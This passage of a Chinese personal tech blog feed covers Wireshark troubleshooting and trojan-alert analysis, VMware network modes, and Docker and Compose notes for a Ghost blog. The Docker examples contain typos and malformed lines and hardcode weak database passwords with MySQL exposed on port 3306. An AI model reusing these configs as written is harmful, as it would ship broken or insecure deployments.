class="headerlink" title="3.问题出在对方身上"></a><strong>3.问题出在对方身上</strong></h3><p>不能访问google 但这个问题不只他自己有<br>这个 是一个全网的问题影响所有的用户， 很有可能是感染了恶意程序导致的，所以不应该直接在网络设备上进行嗅探，网络分流器是最好 的方案，允许我们短暂终端服务后完全被动地获取流量。</p><p>我们能够发送DNS请求，说明我们的网络内的工作站能够连接到外网，DNS也响应了看似正常的ip地址，我们就去访问这个ip，但是服务器并没有响应我们的请求。</p><p><strong>这个问题有三种可能:</strong></p><p>1.web服务器的配置错误</p><p>2.web服务器的协议栈崩溃</p><p>3.远程防火墙的过滤</p><h3 id="4-客户端问题还是打印机问题"><a href="#4-客户端问题还是打印机问题" class="headerlink" title="4.客户端问题还是打印机问题"></a><strong>4.客户端问题还是打印机问题</strong></h3><p>打印机会在用户发送大量作业的情况下只打印几页就停止工作</p><p>因为问题出在打印机上，所以我们希望吧嗅探设备放在离打印机较近的位置，虽然我们不能在打印机上安装嗅探设备，但是我们使用的高级三层交换机能使用端口镜像的功能， 我们将打印机镜像连接到一个空的端口，然后将我们的嗅探设备连接到该端口。</p><p>当本地设备发送TCP数据包到远程设备，但是远程设备没有确认的时候就会发起TCP 重传</p><p>TCP window full  如果wireshark发现发送方的数据会填满接受方的缓存的时候就会标出这个字样</p><p>如果接收方在收到TCP window full 的数据包之后不能及时处理好缓存的问题就就会返回一个 zero window 的数据包，请求 发送方暂缓发送数据（出现zero window 这个情况往往是接收方在软件或者硬件上出现了问题）</p><p>结果是打印机的内存出现了问题，导致一旦访问到内存中的某个区域的时候就会停止响应</p><h3 id="5-是DNS的问题吗"><a href="#5-是DNS的问题吗" class="headerlink" title="5.是DNS的问题吗"></a><strong>5.是DNS的问题吗</strong></h3><p>网络拓扑关系<br>一家公司在总公司外开设了几家公司分部署了一台windows域控制器服务器，和一台备用域控制器公司，公司的所有it设施放置在总部，域控制器负责处理DNS和服务器的认证请求。域控制器是一个代理DNS服务器，接受来自上游的总部的dns资源记录信息，当网络部署团队的工程师将新的 设施延伸分公司的时候发现没有人能访问内部web应用服务器，这些服务器位于总部应用办公室，通过广域网进行访问，问题影响到分公司的所有用户，并只限于内部服务器，所有用户都能访问internet 以及分公司内的其他资源。</p><p>问题可能出现在客户端上我们依旧使用端口镜像</p><p>我们抓到的客户端请求服务器的数据包中的DNS请求的响应表示已经失败Server Failure<br>我们抓到的服务器端的数据包中多出了一个TCP的包，这个包是请求客户端默认的网关的，但是却没有收到响应</p><p>DNS默认使用的是UDP协议，但是在执行如区域传送这种任务的时候使用的是TCP协议，因为TCP对于规模化的数据传输更为有效，当响应超过一定大小的时候DNS就会使用TCP，这种情况下我们就会看到一些触发TCP流量的UDP数据包</p><p>分公司的DNS服务器是总部DNS服务器的从属服务器，也就是 需要依赖这总部服务器获取资源记录，分公司需要的应用服务器是放置在总部的，总部DNS服务器是它的权威DNS服务器，要想分公司的DNS服务器能解析用户对总部应用服务器的请求，总部DNS服务器必须把DNS资源记录传输给分公司的DNS服务器</p><p>这就是总部的DNS服务器会向分公司的DNS服务器发起TCP请求的原因。所以很可能问题出现在办公室之间的路由器或者中心办公室中的DNS服务器可能是罪魁祸首，我们可以嗅探 中心办公室的流量，看看TCP数据包是否到达，结果发现并没有到达，后来发现是路由器配置成了只允许53号端口的UDP流量到达，TCP流量不允许</p><h3 id="6-程序员和网络管理员的矛盾"><a href="#6-程序员和网络管理员的矛盾" class="headerlink" title="6.程序员和网络管理员的矛盾"></a><strong>6.程序员和网络管理员的矛盾</strong></h3><p>为了节约带宽我们不需要实时同步数据<br>文件传输的问题我们就从数据包中提取文件，验证文件在传输过程中有没有遭到破坏，当文件以未加密的格式在网络中进行传输的 时候就会被分解为多个段，并在目的地进行组装我们可以把他提取出来然后与源文件 进行hash 比较</p><h3 id="7-捕获高延迟的罪魁祸首"><a href="#7-捕获高延迟的罪魁祸首" class="headerlink" title="7.捕获高延迟的罪魁祸首"></a><strong>7.捕获高延迟的罪魁祸首</strong></h3><p>网络的高延迟很多情况下不一定网络的问题。<br>最常见的就是TCP的延迟，最常用的方法就是查看TCP 的初始连接握手和接下来的几个数据包</p><p><strong>情景1</strong></p><p>我们看到我们发出去的SYN包在0.2s之后才收到了响应，出现了比较大的延迟，但这个通信并不涉及任何传输层以上的处理，那么发送一个响应只需要非常小的处理量，即使服务器端正在承受巨大的压力也不会有问题，所以不可能会是服务器端的问题，客户端的可能性也可以排除，因为客户端除了等待响应之外没有什么其他的操作。</p><p><strong>情景2</strong></p><p>我们在发送HTTP  GET 之后经过了1.1s  才收到了服务器的响应 。这个实际上并不需要耗费服务器态度的资源，所以我们能判断延迟来源于中间的设备，那么我们就可以检查受影响主机和服务器之间的防火墙、路由器、代理服务器等设备</p><p><strong>情景3</strong></p><p>我们发现在客户端发送了对TCP三次握手的最后的响应之后，之后的GET请求有1.3秒的延迟，构造GET请求包会涉及应用层的部分，我们推断是客户端的问题</p><p><strong>情景4</strong> </p><p>我们之前的一切都很顺利知直到我们收到服务器的对GET请求的响应ACK包之后，本来应该立刻传输到客户端的数据的包出现了1.3秒的延迟。构造这个包需要应用层的协议所以应该是服务器的问题</p><h2 id="四、安全篇"><a href="#四、安全篇" class="headerlink" title="四、安全篇"></a><strong>四、安全篇</strong></h2><h3 id="1-分析一个网站的流量情况"><a href="#1-分析一个网站的流量情况" class="headerlink" title="1.分析一个网站的流量情况"></a><strong>1.分析一个网站的流量情况</strong></h3><p>我们访问一个网站的抓的包邮900多个，因为网站为了美观会在页面中添加很多花哨的设计，这些东西都需要请求和响应。</p><p>我们可以通过会话窗口来分析<br>包含有14个ip会话<br>25个TCP连接<br>14 个UDP会话</p><p>查看协议分布<br>查看summary 概述信息</p><h3 id="3-SYN扫描技术"><a href="#3-SYN扫描技术" class="headerlink" title="3.SYN扫描技术"></a><strong>3.SYN扫描技术</strong></h3><p>黑客 攻击首先会信息收集，攻击者之后就会扫描域名、开放端口以及运行的服务 </p><h3 id="4-嗅探操作系统的信息"><a href="#4-嗅探操作系统的信息" class="headerlink" title="4.嗅探操作系统的信息"></a><strong>4.嗅探操作系统的信息</strong></h3><p>使用p0f这个工具能快速地帮我们恩熙捕获数据包中的信息</p><pre><code class="hljs">p0f -r 数据包地址 </code></pre><h3 id="5-分析一个木马警报的过程"><a href="#5-分析一个木马警报的过程" class="headerlink" title="5.分析一个木马警报的过程"></a><strong>5.分析一个木马警报的过程</strong></h3><p>首先在数据包中搜索木马标志字符串<br>Ctrl+N 就可以多次搜索</p><p>打开会话窗口中的TCP标签就能看到存在的多个会话，我们可以给捕获中的不同会话设置不同的颜色方便我们进一步分析</p><p>我们输入筛选条件</p><pre><code class="hljs">(tcp.flags.syn==1) and (tcp.flags.ack==0)</code></pre><p>这样就获得了初始SYN的数据包<br>然后右键选择着色</p><p>清除过滤条件之后我们可以对不同的会话进行follow tcp stream</p><p>对看到的可以字符串进行搜索</p>]]></content>
    
    
    
    <tags>
      
      <tag>流量分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VMware 使用注意事项以及三种网络模式的拓扑分析</title>
    <link href="/2017/10/27/VMware%20%E4%BD%BF%E7%94%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9%E4%BB%A5%E5%8F%8A%E4%B8%89%E7%A7%8D%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F%E7%9A%84%E6%8B%93%E6%89%91%E5%88%86%E6%9E%90/"/>
    <url>/2017/10/27/VMware%20%E4%BD%BF%E7%94%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9%E4%BB%A5%E5%8F%8A%E4%B8%89%E7%A7%8D%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%BC%8F%E7%9A%84%E6%8B%93%E6%89%91%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="VMware-使用注意事项以及三种网络模式的拓扑分析"><a href="#VMware-使用注意事项以及三种网络模式的拓扑分析" class="headerlink" title="VMware 使用注意事项以及三种网络模式的拓扑分析"></a>VMware 使用注意事项以及三种网络模式的拓扑分析</h2><h6 id="导语：虚拟机已经渐渐成为网络工作人员的日常，使用率最高的恐怕就是著名的VMware了，其实安装虚拟机也有自己的学问，毕竟谁也不想用着用着突然发现哪里出问题了、不能用了，结果是因为最开始自己安装时忽视了一些关键的细节，接下来就给大家介绍一下虚拟机安装过程的注意点，并用拓扑图的方式解释大家一直困惑不已的三种网络连接方式。"><a href="#导语：虚拟机已经渐渐成为网络工作人员的日常，使用率最高的恐怕就是著名的VMware了，其实安装虚拟机也有自己的学问，毕竟谁也不想用着用着突然发现哪里出问题了、不能用了，结果是因为最开始自己安装时忽视了一些关键的细节，接下来就给大家介绍一下虚拟机安装过程的注意点，并用拓扑图的方式解释大家一直困惑不已的三种网络连接方式。" class="headerlink" title="导语：虚拟机已经渐渐成为网络工作人员的日常，使用率最高的恐怕就是著名的VMware了，其实安装虚拟机也有自己的学问，毕竟谁也不想用着用着突然发现哪里出问题了、不能用了，结果是因为最开始自己安装时忽视了一些关键的细节，接下来就给大家介绍一下虚拟机安装过程的注意点，并用拓扑图的方式解释大家一直困惑不已的三种网络连接方式。"></a>导语：虚拟机已经渐渐成为网络工作人员的日常，使用率最高的恐怕就是著名的VMware了，其实安装虚拟机也有自己的学问，毕竟谁也不想用着用着突然发现哪里出问题了、不能用了，结果是因为最开始自己安装时忽视了一些关键的细节，接下来就给大家介绍一下虚拟机安装过程的注意点，并用拓扑图的方式解释大家一直困惑不已的三种网络连接方式。</h6><h3 id="一、注意事项"><a href="#一、注意事项" class="headerlink" title="一、注意事项"></a>一、注意事项</h3><h4 id="0X01-选择以自定义的方式安装虚拟机"><a href="#0X01-选择以自定义的方式安装虚拟机" class="headerlink" title="0X01. 选择以自定义的方式安装虚拟机"></a>0X01. 选择以自定义的方式安装虚拟机</h4><span id="more"></span><p>自定义的方式我们就有权去控制虚拟机的细节，如内存，网络等<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/VMware1.png"></p><h4 id="0X02-选择稍后安装镜像"><a href="#0X02-选择稍后安装镜像" class="headerlink" title="0X02. 选择稍后安装镜像"></a>0X02. 选择稍后安装镜像</h4><p>如果我们一开始就选择好了镜像那么后期系统就会自动安装，一些配置我们就不能自定义了<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/VMware2.png"></p><h4 id="0X03-选择合适的的虚拟机型号"><a href="#0X03-选择合适的的虚拟机型号" class="headerlink" title="0X03. 选择合适的的虚拟机型号"></a>0X03. 选择合适的的虚拟机型号</h4><p>如果型号选择不对，那么VMware给你分配的网卡驱动就会和你的机型不匹配这样后期就可能遇到上网失败的问题<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/VMware3.png"></p><h4 id="0X04-虚拟机分配的最大磁盘大小要比初始值大并且不要选择立即分配空间"><a href="#0X04-虚拟机分配的最大磁盘大小要比初始值大并且不要选择立即分配空间" class="headerlink" title="0X04.虚拟机分配的最大磁盘大小要比初始值大并且不要选择立即分配空间"></a>0X04.虚拟机分配的最大磁盘大小要比初始值大并且不要选择立即分配空间</h4><p>如果你选择了立即分配空间那么计算机就会立刻分配给你虚拟机你上面规定的大小，而不是根据你的实际使用逐渐分配空间（这里初始化是20G,那我们先给个40G,当然这个是根据自己的需要提供的，能大尽量大）<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/VMware4.png"></p><h4 id="0X05-把虚拟磁盘-划分为多个文件（如上图）"><a href="#0X05-把虚拟磁盘-划分为多个文件（如上图）" class="headerlink" title="0X05.把虚拟磁盘 划分为多个文件（如上图）"></a>0X05.把虚拟磁盘 划分为多个文件（如上图）</h4><p>因为有些格式对单个文件的大小有限制如FAT32，所以建议划分成多个文件</p><h4 id="0X06-把没有必要的硬件设备删除"><a href="#0X06-把没有必要的硬件设备删除" class="headerlink" title="0X06. 把没有必要的硬件设备删除"></a>0X06. 把没有必要的硬件设备删除</h4><p>如打印机，光驱，声卡等<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/VMware5.png"></p><h4 id="0X07-虚拟机移动的时候要选择我已移动该虚拟机"><a href="#0X07-虚拟机移动的时候要选择我已移动该虚拟机" class="headerlink" title="0X07.虚拟机移动的时候要选择我已移动该虚拟机"></a>0X07.虚拟机移动的时候要选择我已移动该虚拟机</h4><p>因为如果选择复制那么原虚拟机的网卡mac等信息会原封不动的迁移过来，这样有可能会和本机其他的虚拟机冲突，带来意想不到的麻烦。<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/VMware6.png"></p><h4 id="0X08-VMware左侧可以创建文件夹方便虚拟机的管理"><a href="#0X08-VMware左侧可以创建文件夹方便虚拟机的管理" class="headerlink" title="0X08. VMware左侧可以创建文件夹方便虚拟机的管理"></a>0X08. VMware左侧可以创建文件夹方便虚拟机的管理</h4><p>侧边栏的快捷键是F9</p><h4 id="0X09-在关键的时刻生成快照方便日后的恢复"><a href="#0X09-在关键的时刻生成快照方便日后的恢复" class="headerlink" title="0X09. 在关键的时刻生成快照方便日后的恢复"></a>0X09. 在关键的时刻生成快照方便日后的恢复</h4><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%BF%AB%E7%85%A7.png"></p><h3 id="以下是linux-特定环境的注意事项-非通用）"><a href="#以下是linux-特定环境的注意事项-非通用）" class="headerlink" title="以下是linux 特定环境的注意事项(非通用）"></a><strong>以下是linux 特定环境的注意事项(非通用）</strong></h3><h4 id="0X01-安装linux过程中可能会有两次语言的选择，第一次是安装语言，第二次是系统语言"><a href="#0X01-安装linux过程中可能会有两次语言的选择，第一次是安装语言，第二次是系统语言" class="headerlink" title="0X01.安装linux过程中可能会有两次语言的选择，第一次是安装语言，第二次是系统语言"></a>0X01.安装linux过程中可能会有两次语言的选择，第一次是安装语言，第二次是系统语言</h4><h4 id="0X02-安装过程中的网络配置一定要选择自动连接"><a href="#0X02-安装过程中的网络配置一定要选择自动连接" class="headerlink" title="0X02.安装过程中的网络配置一定要选择自动连接"></a>0X02.安装过程中的网络配置一定要选择自动连接</h4><p>这样在每次重启服务器的时候就能自动连接了</p><h4 id="0X03-基本分区是不能够扩展的"><a href="#0X03-基本分区是不能够扩展的" class="headerlink" title="0X03.基本分区是不能够扩展的"></a>0X03.基本分区是不能够扩展的</h4><p>我们创建分区的时候建议除了boot分区使用基本卷以外其他分区都使用逻辑卷，因为逻辑卷以后可以随意扩展。</p><h4 id="0X04-交换分区一般是内存的两倍"><a href="#0X04-交换分区一般是内存的两倍" class="headerlink" title="0X04.交换分区一般是内存的两倍"></a>0X04.交换分区一般是内存的两倍</h4><p>注意：最大也要在8-16g这样的范围，不能无限扩大</p><h4 id="0X05-如果你安装图形化那么你至少要找一个有图形化的模式"><a href="#0X05-如果你安装图形化那么你至少要找一个有图形化的模式" class="headerlink" title="0X05.如果你安装图形化那么你至少要找一个有图形化的模式"></a>0X05.如果你安装图形化那么你至少要找一个有图形化的模式</h4><h3 id="二、虚拟机的几种网络连接方式"><a href="#二、虚拟机的几种网络连接方式" class="headerlink" title="二、虚拟机的几种网络连接方式"></a>二、虚拟机的几种网络连接方式</h3><h4 id="先说一下VMware的几个虚拟设备："><a href="#先说一下VMware的几个虚拟设备：" class="headerlink" title="先说一下VMware的几个虚拟设备："></a>先说一下VMware的几个虚拟设备：</h4><h5 id="VMnet0："><a href="#VMnet0：" class="headerlink" title="VMnet0："></a>VMnet0：</h5><p>这是VMware用于虚拟桥接网络下的虚拟交换机；</p><h5 id="VMnet1："><a href="#VMnet1：" class="headerlink" title="VMnet1："></a>VMnet1：</h5><p>这是VMware用于虚拟Host-Only网络下的虚拟交换机；</p><h5 id="VMnet8："><a href="#VMnet8：" class="headerlink" title="VMnet8："></a>VMnet8：</h5><p>这是VMware用于虚拟NAT网络下的虚拟交换机；</p><h5 id="VMware-Network-Adapter-VMnet1："><a href="#VMware-Network-Adapter-VMnet1：" class="headerlink" title="VMware Network Adapter VMnet1："></a>VMware Network Adapter VMnet1：</h5><p>这是Host用于与Host-Only虚拟网络进行通信的虚拟网卡；</p><h5 id="VMware-Network-Adapter-VMnet8："><a href="#VMware-Network-Adapter-VMnet8：" class="headerlink" title="VMware Network Adapter VMnet8："></a>VMware Network Adapter VMnet8：</h5><p>这是Host用于与NAT虚拟网络进行通信的虚拟网卡；</p><p>一旦你安装好虚拟机，在你主机的网络连接中的网络适配器中就会多出两个虚拟的交换机VMnet1 和 VMnet8，因为VMnet0是自动和本地的网卡桥接的，所以在主机的网络适配器中可能看不到它。<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%99%9A%E6%8B%9F%E4%BA%A4%E6%8D%A2%E6%9C%BA.png"></p><h4 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h4><p>虚拟机和宿主机都连接着VMnet0交换机， 由于VMnet0交换机是和本地网卡桥接的所以虚拟机之间以及虚拟机和宿主机之间不仅能互相通信而且能够直接访问外网，外部主机也能方便地访内部虚拟机。<br>网络拓扑图如下：<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A1%A5%E6%8E%A5%E6%96%B9%E5%BC%8F%E7%9A%84%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91.jpg"></p><h6 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h6><p>1.虚拟机相当于和宿主机分离<br>2.虽然共用一个真实网卡但是虚拟机个宿主机的mac地址是各自独立的</p><h4 id="NAT模式"><a href="#NAT模式" class="headerlink" title="NAT模式"></a>NAT模式</h4><p>VMnet8 是NAT模式的虚拟交换机，这个交换机和宿主机的网卡是相连接的，并且VMnet8还通过路由功能与VMnet0相连。所以不仅能通过VMnet8能实现与虚拟机和虚拟机以及虚拟机和宿主机之间的通信，而且虚拟机和宿主机都能通过VMnet0虚拟交换机和外部主机之间通信。<br>网络拓扑图如下：<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/NAT%E6%96%B9%E5%BC%8F%E7%9A%84%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91.jpg"></p><h6 id="注意：-1"><a href="#注意：-1" class="headerlink" title="注意："></a>注意：</h6><p>1.虚拟机和外部主机的通信是建立在宿主机能连接外网的前提下的<br>2.此时的虚拟机不仅要指向VMnet8还要，把VMnet8作为自己的网关<br>3.此时宿主机向访问虚拟机通过的是VMnet8,<br>3.外网主机无法通过NAT的路由进入虚拟机的内网访问到虚拟机</p><h4 id="host-only模式"><a href="#host-only模式" class="headerlink" title="host only模式"></a>host only模式</h4><p>VMnet1 就是host only的虚拟交换机，宿主机以及两台虚拟机都将自己和这个虚拟交换机相连，实现虚拟机之间以及虚拟机个宿主机之间的相互通信，但是由于VMnet1没有路由功能且没有和路由器相连，故虚拟机无法连接外网。<br>网络拓扑图如下：<br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/host%20only%E6%96%B9%E5%BC%8F%E7%9A%84%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91.jpg"></p><h6 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h6><p>主机因为桥接在了VMnet0上，所以始终能连接外网。</p><h3 id="这里有一点要特别说明"><a href="#这里有一点要特别说明" class="headerlink" title="这里有一点要特别说明"></a>这里有一点要特别说明</h3><p>桥接模式很有可能你选好之后，ifconfig发现没有获得ip地址，为什么呢？<br>原因是你桥接的地方不对，如果我们用来上网的是无线网卡，结果你都桥接到有限网卡上去了，那么自然你得不到ip地址，所以我们需要在VMware 左上角的“编辑“中选择“虚拟网络编辑器“中手动配置我们要桥接的设备（桥接用的是VMnet0）</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E6%A1%A5%E6%8E%A5%E6%96%B9%E5%BC%8F%E8%8E%B7%E5%8F%96%E4%B8%8D%E5%88%B0ip%E7%9A%84%E7%BD%91%E7%BB%9C%E6%8B%93%E6%89%91.jpg"></p><h6 id="结语：以上纯属自己安装过程踩过的坑的总结，如有错误希望大家联系我并指正"><a href="#结语：以上纯属自己安装过程踩过的坑的总结，如有错误希望大家联系我并指正" class="headerlink" title="结语：以上纯属自己安装过程踩过的坑的总结，如有错误希望大家联系我并指正"></a>结语：以上纯属自己安装过程踩过的坑的总结，如有错误希望大家联系我并指正</h6><h6 id="个人博客：www-k0rz3n-com"><a href="#个人博客：www-k0rz3n-com" class="headerlink" title="个人博客：www.k0rz3n.com"></a>个人博客：<a href="http://www.k0rz3n.com/">www.k0rz3n.com</a></h6>]]></content>
    
    
    
    <tags>
      
      <tag>learning</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Centos docker使用笔记</title>
    <link href="/2017/10/20/Centos%20docker%20notes/"/>
    <url>/2017/10/20/Centos%20docker%20notes/</url>
    
    <content type="html"><![CDATA[<h3 id="第一步下载docker"><a href="#第一步下载docker" class="headerlink" title="第一步下载docker"></a>第一步下载docker</h3><pre><code class="hljs">yum install dockerservice docker startusermod -aG  docker  username  #将docker 允许username 用户使用不只是root</code></pre><h3 id="简单介绍docker-架构"><a href="#简单介绍docker-架构" class="headerlink" title="简单介绍docker 架构"></a>简单介绍docker 架构</h3><p>1.docker daemon 是docker的核心，他负责下载docker 镜像，运行dokcer容器，我们输入的命令都是交给docker daemon 来实际操作的。</p><p>2.registry是docker 的仓库，所有的docker 镜像存储在里面</p><p>3.所有的镜像在registry 中都被称作为image</p><span id="more"></span><h3 id="简单的操作"><a href="#简单的操作" class="headerlink" title="简单的操作"></a>简单的操作</h3><pre><code class="hljs">docker run ubuntu echo hello worlddocker images #可以看到所有docker 的imagesdocker run -p 8080：80  -d nginx   -p #端口映射把远端的80映射到本地的8080， -d 把container 作为守护进程执行的。</code></pre><p>curl <a href="http://lcoalhost/">http://lcoalhost</a> 就能访问到nginx的主页面</p><p>docker ps  查看当前运行的容器，最前面是容器的id</p><p>docker cp index.html 容器id:&#x2F;&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html 将文件复制到nginx的服务目录下</p><p>docker stop 容器id 停止docker</p><p>注意一下：当你结束了这个容器之后我们的容器就会重置，因为docker对容器的改动是默认不保存的</p><p>docker commit -m ‘message’ 容器id  保存当前容器，会返回一串id 这个是新产生的容器的id<br>这时候你使用 docker images 可以看到我们新产生一个没有名字的容器</p><p>我们可以在上一条命令后面直接跟上名字<br>docker commit -m ‘message’ 容器id  名字</p><p>docker rmi 容器id   我们使用这个命令把之前的那个无名氏删除</p><p>docker ps -a 可以列出曾经的所有容器记录</p><p>docker rm 容器1 id  容器2 id 清除记录</p><h3 id="dockerfile-自创文件建立docker镜像"><a href="#dockerfile-自创文件建立docker镜像" class="headerlink" title="dockerfile 自创文件建立docker镜像"></a>dockerfile 自创文件建立docker镜像</h3><pre><code class="hljs">FROM alpine:latest #基础镜像MAINTAINER K0rz3n #作者CMD echo &#39;hello world&#39; #命令mkdir newdockercd newdocker touch Dockerfilevim Dockerfile</code></pre><p>alpine 是专门为docker构建的很小的linux 环境<br>docker build 构建新的image </p><p>docker build -t 标签 .  （这个点带表路径，表示把当前路径下的所内容交给docker engine ）</p><p>docker images 标签 就会显示刚刚产生的docker run 标签 运行docker</p><pre><code class="hljs">FROM ubuntuMAINTAINER  K0rz3nRUN  sed -i &#39;s/archieve.ubuntu.com/mirrors.ustc.edu.cn/g&#39; /etc/apt/sources.listRUN apt-get updateRUN apt-get install -y nginxCPOY index.html/var/www/htmlENTRYPOINT [&#39;/usr/sbin/nginx&#39;,&#39;-g&#39;,&#39;daemon off&#39;;] #这个是容器的入点，在命令行中用空格分隔执行的命令EXPOSE 80 #暴露端口docker build -t hello_nginx .docker run -d -p 8000:80 hello_nginx </code></pre><p>注意：没有指定ENTRYPOINT 的时候我们使用CMD启动，当指定了ENTRYPOINT 之后我们的CMD就成了ENTRYPOINT 的参数</p><p>###docker 中的镜像分层<br>Dockerfile 中的每一行都产生一个新的层<br>已经存在image 里面的层都是只读的，一旦一个image 被运行成为一个容器就会产生一个新的层，可读可写，这保证了容器是可以被修改的。<br>分层的目的是实现不同image 之间的层的共享，减轻服务器的压力。</p><p>###volume介绍与基本的使用<br>能提供独立于容器之外的持久化存储，还能提供容器与容器之间共享的数据</p><pre><code class="hljs">docker run -d --name nginx -v /usr/share/nginx/html nginx  </code></pre><p>-v 是挂载卷的意思</p><p>docker inspect 名字  检查容器<br>Source 是宿主机的地址<br>Destination 是容器内部的地址<br>表示把宿主机的这个地址挂载到了容器中</p><p>ls 到这个物理机地址可以看到默认的两个文件</p><pre><code class="hljs">docker  exec -it  名字 /bin/bash  #进入容器  it表示交互的意思cd /usr/share/ngnix/html #进入容器的实际目录exit #退出容器docker run -p 8080:80 -d -v $PWD/html:/usr/share/nginx/html nginx   # $PWD是shell的一个环境变量，始终指向当前目录#意思是将当前目录下的html 目录挂载到容器的 /usr/share/nginx/html 下，这样在本地修改的东西就会自动同步到容器中，所以这是一个很好的开发环境mkdir vol3cd vol3mkdir datadocker create -v $PWD/data:/var/data --name data_container ubuntu #产生了一个仅有数据的容器并挂载到ubuntu上docker run  -it --volumes-from  data_container ubuntu /bin/bash #直接进入了容器mount 查看ubuntu的挂载    找到/var/mydata 这就是我们挂载的数据 cd /var/datatouch whatever.txtexit</code></pre><p>进入我们的本机的data目录，那么我们就会看到这个在容器中创建的文件，说明我们的挂载是成功的</p><p>###Registry 的介绍与使用<br>这是一个镜像仓库，用户可以往里面上传有用的镜像供更多的用户下载使用。daemon会把镜像从registry中拉下来。<br>daemon 是守护进程，接收用户的命令</p><pre><code class="hljs">docker search 镜像名     #查找镜像docker pull 镜像名# 拉取镜像docker push 镜像名#上传字节的镜像</code></pre><p>国内的一些仓库<br>daocloud<br>时速云<br>aliyun</p><pre><code class="hljs">docker search whalesaydocker pull docker/whalesaydocker run docker/whalesay cowsay 内容    # 你就会看到画出一个鲸鱼说了内容</code></pre><p>docker tag docker&#x2F;whalesay  xx&#x2F;whalesay  修改tag为 xx&#x2F;whalesay<br>docker push xx&#x2F;whalesay #注意这里面需要一个登陆的操作，需要先有一个账号。<br>docker login</p><p>在网页里登陆dockerhub就会看到自己上传的镜像的细节</p><h3 id="compose的下载"><a href="#compose的下载" class="headerlink" title="compose的下载"></a>compose的下载</h3><p>安装：Linux为例</p><pre><code class="hljs">curl -L https://github.com/docker/compose/releases/download/1.16.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose#这里的反引号意思是把这个命令的输出加到字段中，也可以用$()实现，uname -s 返回的是Linux uname -m 返回的是 x86_64</code></pre><p>安装好之后我们看一下 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose 这个目录的权限<br><br>chmod a+x 修改权限为所人可执行<br>docker-compose –version 查看版本<br>###compose 实战搭建ghost博客程序<br>首先看一下 docker-compose.yaml文件<br>（yaml  是常见的配置文件的格式，通过缩进表示层级之间的关系）</p><p>进入docker 文件<br><br>mkdir ghost<br>cd ghost<br>mkdir ghost<br>mkdir nginx<br>mkdir data<br>cd ghost</p><pre><code class="hljs">touch Dockerfilevim Dockerfile</code></pre><p>Dockerfile<br><br>FROM ghost<br>COPY .&#x2F;config.js &#x2F;var&#x2F;lib&#x2F;ghost&#x2F;config.js<br>EXPOSE 2368<br>CMD [“npm”,”start”,”–prodection”]</p><p>config.js<br><br>var path &#x3D; require[‘path’],<br>config;</p><pre><code class="hljs">config =&#123;        prodection:&#123;            url:&#39;http://mytestblog.com&#39;,            mail:&#123;&#125;,            database:&#123;                    client: &#39;mysql&#39;,                    connection:&#123;                            host: &#39;db&#39;,                            user: &#39;ghost&#39;,                            password: &#39;ghost&#39;,                            database: &#39;ghost&#39;,                            port: &#39;3306&#39;,                            charset: &#39;utf8&#39;                    &#125;,                    debug: false            &#125;,            paths:&#123;                    contentPath:path.join(process.env.GHOST_CONYENT,&#39;/&#39;)            &#125;,            server:&#123;                    host:&#39;0.0.0.0&#39;,                    port:&#39;2368&#39;            &#125;    &#125;&#125;;</code></pre><p>回到上层目录，<br><br>cd nginx<br>touch Dockerfile<br>vim Dockerfile<br>Dockerfile<br><br>FROM nginx<br>COPY nginx.conf &#x2F;etc&#x2F;nginx&#x2F;nginx.conf<br>EXPOSE 80</p><p>新建nginx配置文件<br><br>touch nginx.conf</p><p>nginx.conf</p><pre><code class="hljs">worker_processes 4:events &#123;worker_connections 1024;&#125;http &#123;    server &#123;            listen 80;            location / &#123;                    proxy_pass http://ghost-app:2368;            &#125;    &#125;</code></pre><p>}  </p><p>touch docker-compose.yml #yml是yaml的语法<br><br>vimdocker-compose.yml</p><pre><code class="hljs">version: &#39;2&#39;networks:     ghost:services:     ghost-app:                build: ghost                networks:                        - ghost                depends_on:                        - db                ports:                        - &quot;2368:2368&quot;     nginx :                build: nginx                networks:                        - ghost                depends_on:                        - ghost-app                ports:                        - &quot;80:80&quot;     db:                image: &quot;mysql:5.7.15&quot;                networks:                        ghost:                environment:                        MYSQL_ROO_PASSWORD: mysqlroot                        MYSQL_USER: ghost                        MYSQL_PASSWORD: ghost                volumes:                        - $PWD/data:/var/lib/mysql                ports:                        - &quot;3306:3306&quot;</code></pre><h5 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h5><p>1.以上的yml文件特别注意缩进格式。<br>2.我们的监听的端口一定不能被占用，如果被占用那么请自行修改。</p><p>我们创建了三个文件，ghost nginx 是为了构建镜像用的,data 用来存放博客需要的数据</p><pre><code class="hljs">docker-compose up -d </code></pre><p>如果出错了我们修改错误后可以执行以下的命令</p><pre><code class="hljs">docker-compose stop docker-compose rmdocker-compose builddocker-compose up -d </code></pre><p>访问localhost<br>这样我们的博客系统就上线啦</p>]]></content>
    
    
    
    <tags>
      
      <tag>笔记</tag>
      
